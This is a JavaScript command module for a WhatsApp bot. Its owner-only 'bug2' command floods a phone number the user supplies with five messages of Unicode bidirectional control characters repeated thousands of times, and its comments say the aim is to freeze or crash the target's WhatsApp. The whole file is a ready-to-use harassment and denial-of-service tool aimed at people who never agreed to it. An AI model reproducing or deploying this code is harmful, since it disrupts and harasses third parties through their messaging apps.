const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'bug2',
    aliases: ['freeze2', 'crash2', 'lag2'],
    category: 'owner',
    description: 'Send a heavy bidi payload that freezes WhatsApp for 10 seconds',
    usage: '.bug2 <number>',
    ownerOnly: true,
    react: '💣',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}bug2 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `💣 *Deploying Bidi Bug to +${targetNum}...*` }, { quoted: mek });

        try {
            // The "Real" Freeze Payload: Overlapping Left-To-Right and Right-To-Left marks
            // This forces the WhatsApp text engine into an infinite calculation loop when rendering.
            const payload = '\u202E\u200F\u200E\u202D\u202C\u200E\u200F\u202E'.repeat(5000); 
            
            // We send 5 rapid messages to overload the rendering queue
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(jid, { text: payload });
                // Tiny delay to ensure WhatsApp receives them as separate packets
                await new Promise(r => setTimeout(r, 500)); 
            }
            
            await conn.sendMessage(chatId, { text: `✅ *Bidi Bug Deployed!*\n\nThe target's WhatsApp should freeze for about 10 seconds when they open the chat.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[BUG2] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deploy bug: ${error.message}` }, { quoted: mek });
        }
    }
};